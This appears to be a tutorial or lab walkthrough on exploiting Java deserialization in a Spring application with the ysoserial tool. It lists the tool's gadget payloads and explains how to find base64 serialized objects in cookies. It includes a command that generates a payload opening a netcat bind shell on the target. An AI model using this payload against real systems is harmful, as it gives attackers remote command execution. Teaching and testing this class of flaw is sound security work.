ObjectInputStream

readObject()

The root cause of this issue comes from the fact that the application uses the method readObject() on data coming from the user. However, this is only one part of the problem. In Java (as opposed to Python for example), the path from unserialise to code execution is not obvious. To gain code execution, a suit of gadgets need to be found in the libraries loaded by the application. Some security researchers are currently finding a lot of these gadgets in common libraries and getting them fixed. These libraries are not directly vulnerable, but they allow the exploitation of an application using readObject and loading them.

Exploitation of this vulnerability

The tool ysoserial can be used to exploit this issue. This tool allows an attacker to build malicious Java object that will provide command execution.

This tool currently embeds gadgets for the following libraries:

% java -jar ysoserial-0.0.4-all.jar 
Y SO SERIAL?
Usage: java -jar ysoserial-[version]-all.jar [payload type] '[command to execute]'
  Available payload types:
    CommonsBeanutilsCollectionsLogging1 [commons-beanutils:commons-beanutils:1.9.2, commons-collections:commons-collections:3.1, commons-logging:commons-logging:1.2]
    CommonsCollections1 [commons-collections:commons-collections:3.1]
    CommonsCollections2 [org.apache.commons:commons-collections4:4.0]
    CommonsCollections3 [commons-collections:commons-collections:3.1]
    CommonsCollections4 [org.apache.commons:commons-collections4:4.0]
    Groovy1 [org.codehaus.groovy:groovy:2.3.9]
    Jdk7u21 []
    Spring1 [org.springframework:spring-core:4.1.4.RELEASE, org.springframework:spring-beans:4.1.4.RELEASE]

Here we know that it is a Spring application, therefore we can use the Spring1 payload. If we didn't have this information, we would have to try all the payloads and hope that a "vulnerable" library is loaded by the application.

We can get ysoserial to generate our payload using:

java -jar ysoserial-0.0.4-all.jar Spring1 "/usr/bin/nc -l -p 9999 -e /bin/sh" 


Now we need to find where the serialized object is used. A good indicator is the string rO0, which is the base64 encoded version of \xac\xed\x00. Since serialised Java objects contain a lot of special characters, it's very common for them to get encoded before being transmitted over HTTP.

the cookie starts with rO0 which is a very good indicator of a base64 encoded java serialized object

Once you find where a serialised Java object is used, you will need to base64-encode your payload. You can do this by using the base64 command. If you're on Linux, you can use base64 -w 0 to avoid new lines.

You can also try to exploit this issue with the Burp Extension JavaSerialKiller.
